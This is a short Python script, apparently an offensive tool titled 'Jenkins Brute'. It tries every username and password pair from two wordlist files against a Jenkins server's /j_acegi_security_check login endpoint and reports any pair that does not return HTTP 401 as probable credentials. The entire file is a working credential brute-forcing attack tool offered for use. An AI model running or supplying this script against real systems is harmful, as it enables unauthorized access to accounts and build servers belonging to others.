import requests
import sys

if len(sys.argv) != 4:
    print(f"USAGE : {sys.argv[0]} http(s)://<url>:[port] <userfile> <passfile>")
    sys.exit(1)

print("-------------------------------------------")
print("|            Jenkins Brute                |")
print("|     Coded By : Nehal a.k.a Pwnersec     |")
print("-------------------------------------------")

url = sys.argv[1]
ufile = sys.argv[2]
pfile = sys.argv[3]
endpoint = "/j_acegi_security_check"

with open(ufile, "r") as uf:
    users = uf.read().split()
    with open(pfile, "r") as pf:
        pwds = pf.read().split()
        for user in users:
            for pwd in pwds:
                print(f"Trying {user}/{pwd}")
                data = {
                            "j_username" : user,
                            "j_password" : pwd,
                            "from" : "/asynchPeople/",
                            "Submit" : "Sign in"
                        }
                response = requests.post(url + endpoint, data=data)
                if response.status_code != 401:
                    print(f"Probable creds : {user}/{pwd}. G00dluck.")
                    sys.exit(1)
                
